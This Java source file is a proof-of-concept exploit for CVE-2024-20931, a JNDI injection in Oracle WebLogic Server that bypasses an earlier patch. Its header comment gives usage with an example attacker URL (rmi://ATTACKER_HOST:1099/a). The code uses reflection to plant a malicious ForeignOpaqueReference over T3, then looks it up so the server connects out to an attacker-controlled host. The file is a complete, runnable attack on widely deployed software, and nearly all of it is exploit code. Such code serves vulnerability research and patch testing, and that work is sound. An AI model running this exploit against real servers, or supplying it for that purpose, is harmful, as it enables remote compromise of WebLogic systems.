package com.supeream;

import weblogic.deployment.jms.ForeignOpaqueReference;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.lang.reflect.Field;
import java.util.Hashtable;

/*
 * CVE-2024-20931 - Oracle WebLogic Server JNDI injection (T3/IIOP), a bypass of
 * CVE-2023-21839 via oracle.jms.AQjmsInitialContextFactory.
 *
 * LAB-VERIFIED on 2026-10-01 against container-registry.oracle.com/middleware/weblogic:12.2.1.4
 * (T3 on 127.0.0.1:7001). On lookup the server performed an outbound JRMP/RMI
 * connection to the attacker-controlled host (proof: inbound "JRMI" 0x4a524d49
 * bytes captured by a listener). See ../README.md.
 *
 * Usage:
 *   java com.supeream.CVE_2024_20931 <t3-target> <attacker-jndi-url>
 *   example: java com.supeream.CVE_2024_20931 t3://127.0.0.1:7001 rmi://ATTACKER_HOST:1099/a
 *
 * Original PoC: https://github.com/GlassyAmadeus/CVE-2024-20931
 */
public class CVE_2024_20931 {
    public static void main(String[] args) throws Exception {
        String target = args.length > 0 ? args[0] : "t3://127.0.0.1:7001";
        String jndiUrl = args.length > 1 ? args[1] : "rmi://127.0.0.1:1099/a";

        Hashtable<String, String> env1 = new Hashtable<String, String>();
        env1.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");
        env1.put(Context.PROVIDER_URL, target);
        InitialContext c = new InitialContext(env1);

        // jndiEnvironment of the ForeignOpaqueReference: the AQ factory is the
        // post-21839-patch bypass; the attacker URL is resolved on lookup.
        Hashtable<String, String> env2 = new Hashtable<String, String>();
        env2.put("java.naming.factory.initial", "oracle.jms.AQjmsInitialContextFactory");
        env2.put("datasource", jndiUrl);

        ForeignOpaqueReference f = new ForeignOpaqueReference();
        Field jndiEnvironment = ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
        jndiEnvironment.setAccessible(true);
        jndiEnvironment.set(f, env2);
        Field remoteJNDIName = ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");
        remoteJNDIName.setAccessible(true);
        remoteJNDIName.set(f, jndiUrl);

        c.rebind("glassy", f);     // store malicious reference
        try {
            c.lookup("glassy");    // triggers getReferent() -> JNDI resolve -> callback
        } catch (Exception e) {
            System.out.println("lookup exception (expected after callback): " + e);
        }
        System.out.println("done - check your listener/OAST for a callback from the server");
    }
}
